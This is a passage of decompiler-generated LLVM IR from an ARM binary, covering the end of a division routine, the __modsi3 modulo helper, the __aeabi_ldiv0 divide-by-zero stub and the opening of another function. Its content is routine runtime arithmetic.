  %v4_11e8c = udiv i32 %v3_11e9812, 8
  %v6_11e8c = icmp ult i32 %v1_11e80.v6_11e80.v6_11e88, %v4_11e8c
  %v6_11e90 = select i1 %v6_11e8c, i32 0, i32 %v4_11e8c
  %v1_11e80.v6_11e80.v6_11e88.v6_11e90 = sub i32 %v1_11e80.v6_11e80.v6_11e88, %v6_11e90
  %.demorgan72 = and i1 %.demorgan71, %v6_11e8c
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_11e74
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_11e74, %bb80
  %v2_11e94 = add i32 %v1_11e80.v6_11e80.v6_11e88.v6_11e90, -1
  %v4_11e94 = sub i32 0, %v1_11e80.v6_11e80.v6_11e88.v6_11e90
  %v5_11e94 = and i32 %v1_11e80.v6_11e80.v6_11e88.v6_11e90, %v4_11e94
  %v3_11e98 = udiv i32 %v3_11e9812, 16
  %v5_11e9c = icmp slt i32 %v1_11e80.v6_11e80.v6_11e88.v6_11e90, 1
  br i1 %v5_11e9c, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_11e9c = add i32 %v6_11e9c, -4
  %v9_11e9c = sub i32 3, %v6_11e9c
  %v10_11e9c = and i32 %v9_11e9c, %v6_11e9c
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_11ea4 = phi i32 [ %v6_11e9c, %bb81 ], [ %v7_11e9c, %bb82 ]
  %v0_11ea015.in = phi i32 [ %v2_11e94, %bb81 ], [ %v7_11e9c, %bb82 ]
  %v1_11ea014.in = phi i32 [ %v5_11e94, %bb81 ], [ %v10_11e9c, %bb82 ]
  %v1_11ea014 = icmp slt i32 %v1_11ea014.in, 0
  %v0_11ea015 = icmp slt i32 %v0_11ea015.in, 0
  %v2_11ea0 = xor i1 %v0_11ea015, %v1_11ea014
  br i1 %v2_11ea0, label %dec_label_pc_11ea4, label %dec_label_pc_11e74

dec_label_pc_11ea4:                               ; preds = %bb83
  %v1_11ea4 = urem i32 %v0_11ea4, 4
  %v2_11ea4 = icmp eq i32 %v1_11ea4, 0
  br i1 %v2_11ea4, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_11ea4
  %v3_11ea8 = icmp eq i32 %v1_11e80.v6_11e80.v6_11e88.v6_11e90, 0
  br i1 %v3_11ea8, label %bb76, label %dec_label_pc_11eb0

dec_label_pc_11eb0:                               ; preds = %bb84, %dec_label_pc_11e6c
  %v0_11ec4 = phi i32 [ %v3_11e98, %bb84 ], [ %v1_11e60, %dec_label_pc_11e6c ]
  %v1_11ec0 = phi i32 [ %v1_11e80.v6_11e80.v6_11e88.v6_11e90, %bb84 ], [ %v1_11e2c, %dec_label_pc_11e6c ]
  %v0_11eb0 = phi i32 [ %v0_11ea4, %bb84 ], [ %v2_11e6c, %dec_label_pc_11e6c ]
  %v5_11eb4 = icmp slt i32 %v0_11eb0, -2
  br i1 %v5_11eb4, label %dec_label_pc_11ed4, label %dec_label_pc_11eb8

dec_label_pc_11eb8:                               ; preds = %dec_label_pc_11eb0
  %v8_11eb0 = icmp eq i32 %v0_11eb0, -2
  br i1 %v8_11eb0, label %dec_label_pc_11ec8, label %dec_label_pc_11ebc

dec_label_pc_11ebc:                               ; preds = %dec_label_pc_11eb8
  %v3_11ebc = icmp ult i32 %v1_11ec0, %v0_11ec4
  br i1 %v3_11ebc, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_11ebc
  %v2_11ebc = sub i32 %v1_11ec0, %v0_11ec4
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_11ebc, %bb85
  %v0_11ec852 = phi i32 [ %v1_11ec0, %dec_label_pc_11ebc ], [ %v2_11ebc, %bb85 ]
  %v3_11ec4 = udiv i32 %v0_11ec4, 2
  br label %dec_label_pc_11ec8

dec_label_pc_11ec8:                               ; preds = %dec_label_pc_11eb8, %bb86
  %v0_11ed0 = phi i32 [ %v0_11ec4, %dec_label_pc_11eb8 ], [ %v3_11ec4, %bb86 ]
  %v1_11ecc = phi i32 [ %v1_11ec0, %dec_label_pc_11eb8 ], [ %v0_11ec852, %bb86 ]
  %v3_11ec8 = icmp ult i32 %v1_11ecc, %v0_11ed0
  br i1 %v3_11ec8, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_11ec8
  %v2_11ec8 = sub i32 %v1_11ecc, %v0_11ed0
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_11ec8, %bb87
  %v0_11ed455 = phi i32 [ %v1_11ecc, %dec_label_pc_11ec8 ], [ %v2_11ec8, %bb87 ]
  %v3_11ed0 = udiv i32 %v0_11ed0, 2
  br label %dec_label_pc_11ed4

dec_label_pc_11ed4:                               ; preds = %dec_label_pc_11eb0, %bb88
  %v2_11ed8 = phi i32 [ %v0_11ec4, %dec_label_pc_11eb0 ], [ %v3_11ed0, %bb88 ]
  %v1_11ed8 = phi i32 [ %v1_11ec0, %dec_label_pc_11eb0 ], [ %v0_11ed455, %bb88 ]
  %v3_11ed4 = icmp ult i32 %v1_11ed8, %v2_11ed8
  br i1 %v3_11ed4, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_11ed4
  %v2_11ed4 = sub i32 %v1_11ed8, %v2_11ed8
  br label %bb76

dec_label_pc_11ee0:                               ; preds = %entry
  %v0_11ee0 = load i32, i32* @lr, align 4
  %v0_11ee4 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_11ee0)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_11ed8, { 1, 2, 0 }
  uselistorder i32 %v0_11ec4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_11ea4, { 1, 0, 2 }
  uselistorder i32 %v7_11e9c, { 1, 0 }
  uselistorder i32 %v3_11e98, { 1, 0 }
  uselistorder i32 %v1_11e80.v6_11e80.v6_11e88.v6_11e90, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_11e8c, { 1, 0 }
  uselistorder i32 %v4_11e84, { 1, 0 }
  uselistorder i32 %v4_11e7c, { 1, 0 }
  uselistorder i32 %v6_11e9c, { 3, 0, 2, 1 }
  uselistorder i32 %v2_11e6c, { 1, 0 }
  uselistorder i32 %v1_11e60, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_11e4c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_11e58.pr3398, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11e2c, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_11ed4, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_11ec8, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_11e74, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @__modsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_11ef0 = icmp eq i32 %arg2, 0
  br i1 %v2_11ef0, label %dec_label_pc_11fc4, label %dec_label_pc_11ef8

dec_label_pc_11ef8:                               ; preds = %entry
  %v1_11ef0 = icmp slt i32 %arg2, 0
  br i1 %v1_11ef0, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_11ef8
  %v2_11ef8 = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_11ef8, %bb
  %v4_11f10 = phi i32 [ %arg2, %dec_label_pc_11ef8 ], [ %v2_11ef8, %bb ]
  %v0_11efc = load i32, i32* @r0, align 4
  %v1_11efc = icmp slt i32 %v0_11efc, 0
  br i1 %v1_11efc, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_11f00 = sub i32 0, %v0_11efc
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_11f08 = phi i32 [ %v0_11efc, %bb79 ], [ %v2_11f00, %bb80 ]
  %v1_11f04 = add i32 %v4_11f10, -1
  %v7_11f04 = icmp eq i32 %v4_11f10, 1
  br i1 %v7_11f04, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_11f08 = icmp eq i32 %v1_11f08, %v4_11f10
  br i1 %v10_11f08, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_11f08 = icmp ult i32 %v1_11f08, %v4_11f10
  br i1 %v4_11f08, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_11f10 = and i32 %v1_11f04, %v4_11f10
  %v8_11f10 = icmp eq i32 %v6_11f10, 0
  br i1 %v8_11f10, label %.thread72, label %dec_label_pc_11f20.preheader

dec_label_pc_11f20.preheader:                     ; preds = %bb84
  %v2_11f20107 = icmp ugt i32 %v4_11f10, 268435455
  br i1 %v2_11f20107, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_11f1464 = phi i32 [ %v1_11f08, %bb84 ], [ 0, %.thread70 ]
  %v3_11f14 = and i32 %v1_11f1464, %v1_11f04
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_11f20.preheader
  %v0_11f34.pr35.lcssa = phi i32 [ %v4_11f10, %dec_label_pc_11f20.preheader ], [ %v4_11f28, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_11f20.preheader ], [ %v2_11f2c9, %.thread2.thread7 ]
  br label %dec_label_pc_11f34thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_11f20.preheader, %.thread2.thread7
  %storemerge109 = phi i32 [ %v2_11f2c9, %.thread2.thread7 ], [ 0, %dec_label_pc_11f20.preheader ]
  %v0_11f34.pr35108 = phi i32 [ %v4_11f28, %.thread2.thread7 ], [ %v4_11f10, %dec_label_pc_11f20.preheader ]
  %v4_11f24 = icmp ult i32 %v0_11f34.pr35108, %v1_11f08
  br i1 %v4_11f24, label %bb86, label %dec_label_pc_11f34thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_11f28 = and i32 %v0_11f34.pr35108, 268435456
  %v3_11f28 = icmp eq i32 %v2_11f28, 0
  %v4_11f28 = mul i32 %v0_11f34.pr35108, 16
  br i1 %v3_11f28, label %.thread2.thread7, label %dec_label_pc_11f34.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_11f2c9 = add i32 %storemerge109, 4
  %v2_11f20 = icmp ugt i32 %v4_11f28, 268435455
  br i1 %v2_11f20, label %.thread1, label %bb85

dec_label_pc_11f34thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_11f34thread-pre-split.loopexit

dec_label_pc_11f34thread-pre-split.loopexit:      ; preds = %dec_label_pc_11f34thread-pre-split.loopexit.loopexit, %.thread1
  %v0_11f34.pr35106 = phi i32 [ %v0_11f34.pr35.lcssa, %.thread1 ], [ %v0_11f34.pr35108, %dec_label_pc_11f34thread-pre-split.loopexit.loopexit ]
  %storemerge103 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge109, %dec_label_pc_11f34thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_11f34thread-pre-split

dec_label_pc_11f34thread-pre-split:               ; preds = %.thread4, %dec_label_pc_11f34thread-pre-split.loopexit
  %v1_11f4041 = phi i32 [ %storemerge103, %dec_label_pc_11f34thread-pre-split.loopexit ], [ %v2_11f40, %.thread4 ]
  %v2_11f3836 = phi i32 [ %v1_11f08, %dec_label_pc_11f34thread-pre-split.loopexit ], [ %v2_11f38, %.thread4 ]
  %v0_11f34.pr = phi i32 [ %v0_11f34.pr35106, %dec_label_pc_11f34thread-pre-split.loopexit ], [ %v3_11f3c, %.thread4 ]
  br label %dec_label_pc_11f34

dec_label_pc_11f34.loopexit:                      ; preds = %bb86
  br label %dec_label_pc_11f34

dec_label_pc_11f34:                               ; preds = %dec_label_pc_11f34.loopexit, %dec_label_pc_11f34thread-pre-split
  %v0_11f48.pr = phi i32 [ %v1_11f4041, %dec_label_pc_11f34thread-pre-split ], [ %storemerge109, %dec_label_pc_11f34.loopexit ]
  %v2_11f38 = phi i32 [ %v2_11f3836, %dec_label_pc_11f34thread-pre-split ], [ %v1_11f08, %dec_label_pc_11f34.loopexit ]
  %v1_11f3c = phi i32 [ %v0_11f34.pr, %dec_label_pc_11f34thread-pre-split ], [ %v4_11f28, %dec_label_pc_11f34.loopexit ]
  %v2_11f34 = icmp slt i32 %v1_11f3c, 0
  br i1 %v2_11f34, label %dec_label_pc_11f48, label %bb87

bb87:                                             ; preds = %dec_label_pc_11f34
  %v4_11f38 = icmp ult i32 %v1_11f3c, %v2_11f38
  br i1 %v4_11f38, label %.thread4, label %dec_label_pc_11f48

.thread4:                                         ; preds = %bb87
  %v3_11f3c = mul i32 %v1_11f3c, 2
  %v2_11f40 = add i32 %v0_11f48.pr, 1
  br label %dec_label_pc_11f34thread-pre-split

dec_label_pc_11f48:                               ; preds = %bb87, %dec_label_pc_11f34
  %v2_11f48 = add i32 %v0_11f48.pr, -3
  %v5_11f4c = icmp slt i32 %v0_11f48.pr, 3
  br i1 %v5_11f4c, label %dec_label_pc_11f8c, label %dec_label_pc_11f50

dec_label_pc_11f50:                               ; preds = %dec_label_pc_11f48, %bb91
  %v6_11f78 = phi i32 [ %v0_11f80, %bb91 ], [ %v2_11f48, %dec_label_pc_11f48 ]
  %v1_11f54 = phi i32 [ %v1_11f5c.v6_11f5c.v6_11f64.v6_11f6c, %bb91 ], [ %v2_11f38, %dec_label_pc_11f48 ]
  %v3_11f7410 = phi i32 [ %v3_11f74, %bb91 ], [ %v1_11f3c, %dec_label_pc_11f48 ]
  %v3_11f50 = icmp ult i32 %v1_11f54, %v3_11f7410
  %v3_11f54 = select i1 %v3_11f50, i32 0, i32 %v3_11f7410
  %v1_11f5c = sub i32 %v1_11f54, %v3_11f54
  %v4_11f58 = udiv i32 %v3_11f7410, 2
  %v6_11f58 = icmp ult i32 %v1_11f5c, %v4_11f58
  %v6_11f5c = select i1 %v6_11f58, i32 0, i32 %v4_11f58
  %v1_11f5c.v6_11f5c = sub i32 %v1_11f5c, %v6_11f5c
  %.demorgan = and i1 %v3_11f50, %v6_11f58
  %v4_11f60 = udiv i32 %v3_11f7410, 4
  %v6_11f60 = icmp ult i32 %v1_11f5c.v6_11f5c, %v4_11f60
  %v6_11f64 = select i1 %v6_11f60, i32 0, i32 %v4_11f60
  %v1_11f5c.v6_11f5c.v6_11f64 = sub i32 %v1_11f5c.v6_11f5c, %v6_11f64
  %.demorgan76 = and i1 %.demorgan, %v6_11f60
  %v4_11f68 = udiv i32 %v3_11f7410, 8
  %v6_11f68 = icmp ult i32 %v1_11f5c.v6_11f5c.v6_11f64, %v4_11f68
  %v6_11f6c = select i1 %v6_11f68, i32 0, i32 %v4_11f68
  %v1_11f5c.v6_11f5c.v6_11f64.v6_11f6c = sub i32 %v1_11f5c.v6_11f5c.v6_11f64, %v6_11f6c
  %.demorgan77 = and i1 %.demorgan76, %v6_11f68
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_11f50
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_11f50, %bb88
  %v2_11f70 = add i32 %v1_11f5c.v6_11f5c.v6_11f64.v6_11f6c, -1
  %v4_11f70 = sub i32 0, %v1_11f5c.v6_11f5c.v6_11f64.v6_11f6c
  %v5_11f70 = and i32 %v1_11f5c.v6_11f5c.v6_11f64.v6_11f6c, %v4_11f70
  %v3_11f74 = udiv i32 %v3_11f7410, 16
  %v5_11f78 = icmp slt i32 %v1_11f5c.v6_11f5c.v6_11f64.v6_11f6c, 1
  br i1 %v5_11f78, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_11f78 = add i32 %v6_11f78, -4
  %v9_11f78 = sub i32 3, %v6_11f78
  %v10_11f78 = and i32 %v9_11f78, %v6_11f78
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_11f80 = phi i32 [ %v6_11f78, %bb89 ], [ %v7_11f78, %bb90 ]
  %v0_11f7c13.in = phi i32 [ %v2_11f70, %bb89 ], [ %v7_11f78, %bb90 ]
  %v1_11f7c12.in = phi i32 [ %v5_11f70, %bb89 ], [ %v10_11f78, %bb90 ]
  %v1_11f7c12 = icmp slt i32 %v1_11f7c12.in, 0
  %v0_11f7c13 = icmp slt i32 %v0_11f7c13.in, 0
  %v2_11f7c = xor i1 %v0_11f7c13, %v1_11f7c12
  br i1 %v2_11f7c, label %dec_label_pc_11f80, label %dec_label_pc_11f50

dec_label_pc_11f80:                               ; preds = %bb91
  %v1_11f80 = urem i32 %v0_11f80, 4
  %v2_11f80 = icmp eq i32 %v1_11f80, 0
  br i1 %v2_11f80, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_11f80
  %v3_11f84 = icmp eq i32 %v1_11f5c.v6_11f5c.v6_11f64.v6_11f6c, 0
  br i1 %v3_11f84, label %.thread6, label %dec_label_pc_11f8c

dec_label_pc_11f8c:                               ; preds = %bb92, %dec_label_pc_11f48
  %v0_11fa0 = phi i32 [ %v3_11f74, %bb92 ], [ %v1_11f3c, %dec_label_pc_11f48 ]
  %v1_11f9c = phi i32 [ %v1_11f5c.v6_11f5c.v6_11f64.v6_11f6c, %bb92 ], [ %v2_11f38, %dec_label_pc_11f48 ]
  %v0_11f8c = phi i32 [ %v0_11f80, %bb92 ], [ %v2_11f48, %dec_label_pc_11f48 ]
  %v5_11f90 = icmp slt i32 %v0_11f8c, -2
  br i1 %v5_11f90, label %dec_label_pc_11fb0, label %dec_label_pc_11f94

dec_label_pc_11f94:                               ; preds = %dec_label_pc_11f8c
  %v8_11f8c = icmp eq i32 %v0_11f8c, -2
  br i1 %v8_11f8c, label %dec_label_pc_11fa4, label %dec_label_pc_11f98

dec_label_pc_11f98:                               ; preds = %dec_label_pc_11f94
  %v3_11f98 = icmp ult i32 %v1_11f9c, %v0_11fa0
  br i1 %v3_11f98, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_11f98
  %v2_11f98 = sub i32 %v1_11f9c, %v0_11fa0
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_11f98, %bb93
  %v0_11fa454 = phi i32 [ %v1_11f9c, %dec_label_pc_11f98 ], [ %v2_11f98, %bb93 ]
  %v3_11fa0 = udiv i32 %v0_11fa0, 2
  br label %dec_label_pc_11fa4

dec_label_pc_11fa4:                               ; preds = %dec_label_pc_11f94, %bb94
  %v0_11fac = phi i32 [ %v0_11fa0, %dec_label_pc_11f94 ], [ %v3_11fa0, %bb94 ]
  %v1_11fa8 = phi i32 [ %v1_11f9c, %dec_label_pc_11f94 ], [ %v0_11fa454, %bb94 ]
  %v3_11fa4 = icmp ult i32 %v1_11fa8, %v0_11fac
  br i1 %v3_11fa4, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_11fa4
  %v2_11fa4 = sub i32 %v1_11fa8, %v0_11fac
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_11fa4, %bb95
  %v0_11fb057 = phi i32 [ %v1_11fa8, %dec_label_pc_11fa4 ], [ %v2_11fa4, %bb95 ]
  %v3_11fac = udiv i32 %v0_11fac, 2
  br label %dec_label_pc_11fb0

dec_label_pc_11fb0:                               ; preds = %dec_label_pc_11f8c, %bb96
  %v2_11fb4 = phi i32 [ %v0_11fa0, %dec_label_pc_11f8c ], [ %v3_11fac, %bb96 ]
  %v1_11fb4 = phi i32 [ %v1_11f9c, %dec_label_pc_11f8c ], [ %v0_11fb057, %bb96 ]
  %v3_11fb0 = icmp ult i32 %v1_11fb4, %v2_11fb4
  br i1 %v3_11fb0, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_11fb0
  %v2_11fb0 = sub i32 %v1_11fb4, %v2_11fb4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_11fb0, %bb83, %.thread72, %dec_label_pc_11f80, %bb92, %bb97
  %v1_11fbc = phi i32 [ %v1_11f5c.v6_11f5c.v6_11f64.v6_11f6c, %dec_label_pc_11f80 ], [ 0, %bb92 ], [ %v1_11fb4, %dec_label_pc_11fb0 ], [ %v2_11fb0, %bb97 ], [ %v3_11f14, %.thread72 ], [ %v1_11f08, %bb83 ]
  br i1 %v1_11efc, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_11fbc = sub i32 0, %v1_11fbc
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_11fc0 = phi i32 [ %v1_11fbc, %.thread6 ], [ %v2_11fbc, %bb98 ]
  ret i32 %v1_11fc0

dec_label_pc_11fc4:                               ; preds = %entry
  %v0_11fc4 = load i32, i32* @lr, align 4
  %v0_11fc8 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_11fc4)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_11fa0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_11f80, { 1, 0, 2 }
  uselistorder i32 %v7_11f78, { 1, 0 }
  uselistorder i32 %v3_11f74, { 1, 0 }
  uselistorder i32 %v1_11f5c.v6_11f5c.v6_11f64.v6_11f6c, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_11f68, { 1, 0 }
  uselistorder i32 %v4_11f60, { 1, 0 }
  uselistorder i32 %v4_11f58, { 1, 0 }
  uselistorder i32 %v6_11f78, { 3, 0, 2, 1 }
  uselistorder i32 %v2_11f48, { 1, 0 }
  uselistorder i32 %v1_11f3c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_11f38, { 1, 0, 3, 2 }
  uselistorder i32 %v4_11f28, { 1, 0, 3, 2 }
  uselistorder i32 %v0_11f34.pr35108, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11f08, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_11f10, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 ()* @__aeabi_ldiv0, { 2, 1, 0 }
  uselistorder i32* @lr, { 4, 5, 6, 2, 0, 3, 1 }
  uselistorder i32 -2, { 0, 12, 1, 13, 2, 3, 8, 10, 9, 7, 6, 5, 4, 14, 15, 16, 17, 11 }
  uselistorder i32 8, { 7, 8, 33, 16, 9, 10, 15, 11, 18, 39, 19, 12, 13, 14, 34, 24, 35, 25, 36, 26, 37, 27, 38, 17, 40, 41, 42, 43, 45, 28, 46, 29, 47, 48, 44, 49, 50, 51, 3, 52, 53, 54, 4, 55, 56, 57, 58, 59, 60, 61, 5, 62, 63, 64, 65, 66, 67, 68, 6, 72, 20, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 21, 91, 22, 92, 23, 93, 30, 94, 0, 1, 32, 69, 70, 31, 71, 2 }
  uselistorder i32 3, { 58, 21, 59, 22, 143, 60, 24, 61, 39, 62, 2, 63, 64, 65, 66, 37, 4, 67, 68, 69, 1, 23, 70, 40, 71, 38, 72, 41, 25, 42, 43, 44, 45, 46, 0, 73, 74, 75, 76, 77, 78, 79, 6, 5, 47, 80, 26, 81, 82, 83, 84, 85, 8, 7, 48, 86, 27, 87, 88, 89, 90, 49, 91, 10, 9, 29, 92, 28, 93, 94, 95, 96, 50, 97, 12, 11, 31, 98, 30, 99, 51, 101, 102, 103, 104, 105, 106, 52, 107, 53, 108, 32, 109, 110, 111, 112, 113, 14, 13, 54, 33, 114, 115, 116, 117, 118, 119, 16, 15, 55, 120, 34, 121, 122, 123, 124, 125, 126, 127, 18, 17, 56, 128, 35, 129, 130, 131, 132, 133, 134, 135, 20, 19, 57, 136, 36, 137, 138, 139, 141, 142, 140, 3, 100 }
  uselistorder i32 2, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 129, 13, 14, 15, 16, 17, 71, 72, 52, 53, 73, 146, 74, 77, 134, 78, 135, 76, 136, 140, 63, 131, 64, 132, 65, 133, 66, 137, 67, 138, 68, 139, 69, 145, 141, 142, 143, 144, 59, 79, 147, 18, 19, 148, 149, 80, 150, 55, 130, 51, 151, 75, 152, 20, 81, 235, 83, 153, 85, 154, 84, 155, 82, 86, 156, 21, 22, 87, 157, 60, 88, 89, 90, 91, 61, 93, 94, 92, 95, 96, 97, 98, 99, 100, 54, 58, 158, 159, 160, 222, 223, 161, 162, 163, 164, 165, 166, 0, 23, 24, 25, 26, 27, 28, 101, 167, 70, 168, 169, 170, 171, 172, 1, 29, 30, 31, 32, 33, 34, 103, 102, 173, 174, 35, 175, 176, 105, 178, 56, 177, 47, 48, 2, 36, 37, 38, 39, 40, 106, 179, 104, 180, 181, 41, 182, 183, 108, 185, 57, 184, 49, 50, 3, 42, 43, 44, 45, 46, 109, 186, 107, 187, 189, 190, 191, 192, 193, 194, 195, 111, 196, 110, 197, 198, 199, 200, 201, 113, 112, 202, 203, 204, 205, 206, 207, 208, 209, 115, 210, 114, 211, 212, 213, 214, 117, 215, 118, 216, 217, 218, 219, 119, 220, 116, 221, 224, 225, 226, 227, 228, 229, 121, 230, 120, 231, 232, 122, 123, 124, 233, 236, 125, 126, 127, 237, 234, 128, 62, 188 }
  uselistorder i32 4, { 6, 7, 43, 8, 9, 44, 330, 331, 138, 10, 11, 70, 52, 254, 244, 39, 167, 168, 169, 159, 160, 170, 171, 148, 149, 73, 139, 140, 141, 74, 142, 75, 143, 144, 145, 146, 147, 150, 151, 152, 153, 154, 155, 156, 157, 158, 72, 162, 163, 164, 161, 45, 172, 53, 76, 77, 12, 173, 13, 174, 175, 14, 15, 176, 177, 34, 178, 35, 165, 71, 166, 183, 78, 185, 79, 186, 80, 187, 188, 184, 179, 81, 180, 181, 182, 321, 189, 42, 41, 40, 190, 82, 16, 17, 18, 19, 20, 191, 36, 192, 37, 193, 194, 195, 0, 83, 196, 197, 97, 198, 199, 200, 201, 98, 99, 2, 202, 84, 203, 54, 204, 205, 206, 100, 207, 208, 101, 102, 3, 46, 209, 55, 210, 56, 211, 212, 103, 213, 214, 215, 216, 217, 104, 105, 218, 219, 85, 220, 4, 47, 221, 57, 222, 86, 223, 224, 106, 225, 226, 227, 228, 229, 107, 108, 230, 231, 87, 232, 5, 48, 233, 58, 234, 88, 235, 21, 245, 246, 109, 247, 248, 249, 110, 111, 90, 250, 89, 252, 59, 253, 255, 112, 256, 257, 113, 114, 258, 60, 259, 61, 260, 261, 262, 263, 115, 264, 265, 266, 116, 117, 91, 267, 49, 62, 268, 63, 269, 270, 271, 272, 273, 274, 92, 275, 93, 276, 118, 277, 278, 279, 119, 120, 94, 280, 50, 281, 64, 282, 65, 283, 284, 285, 121, 122, 286, 123, 287, 288, 124, 125, 51, 289, 66, 290, 67, 291, 292, 293, 294, 295, 95, 296, 68, 297, 322, 323, 324, 325, 96, 327, 69, 328, 126, 298, 299, 22, 127, 300, 301, 23, 128, 302, 303, 24, 129, 304, 305, 25, 130, 306, 307, 26, 131, 308, 309, 27, 310, 132, 311, 312, 28, 133, 313, 314, 29, 134, 315, 316, 30, 135, 317, 318, 31, 136, 319, 320, 32, 326, 236, 237, 238, 239, 33, 240, 241, 1, 242, 137, 243, 251, 329, 38 }
  uselistorder i32 16, { 5, 6, 7, 8, 9, 25, 10, 11, 0, 12, 13, 41, 73, 42, 30, 43, 71, 72, 74, 75, 76, 26, 70, 77, 14, 15, 24, 67, 16, 78, 17, 44, 31, 79, 32, 45, 46, 80, 47, 81, 48, 82, 49, 83, 50, 84, 51, 52, 85, 53, 54, 86, 87, 56, 88, 89, 90, 91, 92, 1, 55, 93, 94, 95, 58, 96, 97, 98, 99, 100, 2, 57, 101, 59, 102, 103, 104, 18, 105, 19, 106, 68, 20, 60, 61, 107, 108, 3, 34, 109, 33, 110, 62, 111, 112, 113, 21, 114, 22, 115, 69, 23, 63, 64, 116, 117, 4, 36, 118, 35, 119, 27, 121, 122, 123, 124, 65, 125, 126, 127, 128, 129, 130, 131, 28, 132, 133, 134, 135, 137, 136, 138, 139, 140, 141, 142, 143, 144, 29, 145, 146, 147, 148, 149, 151, 150, 152, 153, 154, 155, 156, 157, 66, 158, 159, 160, 38, 161, 37, 40, 162, 39, 120 }
  uselistorder i32 268435455, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_11fb0, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_11fa4, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_11f50, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @__aeabi_ldiv0() local_unnamed_addr {
entry:
  %v1_11fd4 = load i32, i32* @r0, align 4
  ret i32 %v1_11fd4
}

define i32 @function_11fd8(i32 %arg1) local_unnamed_addr {
dec_label_pc_11fd8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11fdc = load i32, i32* @global_var_1a204.376, align 4
  %v2_11fe0 = icmp eq i32 %v3_11fdc, -1
  %v3_11fe4 = load i32, i32* @r4, align 4
  store i32 %v3_11fe4, i32* %stack_var_-8, align 4
